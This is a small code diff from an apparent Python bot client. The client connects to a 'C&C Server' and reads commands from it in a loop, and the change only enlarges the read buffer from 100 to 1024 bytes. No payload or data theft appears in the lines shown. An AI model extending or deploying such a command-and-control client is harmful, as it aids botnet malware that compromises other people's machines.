@@ -26,7 +26,7 @@ async def start_bot():
     await writer.drain()
     print('Connected to C&C Server')
     while True:
-        data = await reader.read(100)
+        data = await reader.read(1024)
         if not data:
             break
         message = data.decode()
